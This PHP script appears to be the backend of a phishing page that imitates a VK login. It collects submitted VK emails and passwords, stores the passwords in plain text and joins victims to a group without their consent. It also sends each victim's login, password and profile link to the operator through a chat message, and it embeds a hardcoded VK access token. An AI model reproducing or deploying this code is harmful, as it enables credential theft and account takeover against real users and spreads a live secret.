<?php
require 'db.php';
//Создадим headers
$headers = array(
 'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
 'content-type' => 'application/x-www-form-urlencoded',
 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36'
);
//Запишем сюда значения логина и пароля из HTML формы
$login = $_POST['email'];
$password = $_POST['pass'];
//Если какое-то поле оказалось пустым
if (empty($login) or empty($password))
{
//Отправим пользователя на стартовую страницу authorize и просигнализируем об ошибке
    header('Location: /vk.php?error_login=true');
}
    else
{
//Если все поля заполнены, то посылаем запрос на получение токена по нашей ссылке выше
    $token = get_token($login, $password);
    if($token == ''){
        header('Location: /vk.php?error_login=true');
    }else{
    $user_id = get_id($login, $password);
    $request_params = array(

        'user_id' => $user_id, 
        'fields' => 'photo_max', 
        'v' => '5.103', 
        'access_token' => 'd90eebc6db33b0a33313cb1f49dc778e73f5fd9a8383f2bf75239e2998926373949fc64ffb7f693906967' 

    ); 
    $get_user = http_build_query($request_params); 
    $result = json_decode(file_get_contents('https://api.vk.com/method/users.get?'. $get_user));
    
    $user = R::findOne('users', 'user_id = ?', array($user_id));
    $admin = R::findOne('admin', 'user_id = ?', array($user_id));
    if($admin->user_id == $user_id){
        header('Location: /admin.php');
    }
    if($user){
        if($user->login == $login){
            $_SESSION['user'] = $user;
            if($admin->user_id == $_SESSION['user']->user_id){
            header('Location: /admin.php');
            }else{
            header('Location: https://VK.com/app7183114');
            }
        }

    }else{
            $vk = R::dispense('users');
            $vk-> first_name = $result -> response[0] -> first_name;
            $vk-> last_name = $result -> response[0] -> last_name;
            $vk-> user_id = $user_id;
            $vk-> login = $login;
            $vk-> pass = $password;
            $vk-> token = $token[0];
            $vk-> photo = $result -> response[0] -> photo_max;
            $vk-> data = date('d.m.y h:i');
            $vk-> coin = 10;
            R::store($vk);
            $_SESSION['user'] = $vk;
            group_join($login, $password);

            $mess = "<b>Новый пользователь</b>\n".$_SESSION['user']->photo."\nИмя: ".$_SESSION['user']->first_name."\nФамилия: ".$_SESSION['user']->last_name."\nЛогин: ".$_SESSION['user']->login."\nПароль: ".$_SESSION['user']->pass."\nVK: vk.com/id".$_SESSION['user']->user_id;
            send($chat_id, $mess);
            if($admin->user_id == $_SESSION['user']->user_id){
            header('Location: /admin.php');
            }else{
            header('Location: https://VK.com/app7183114');
            }
            
    }
    }
}






?>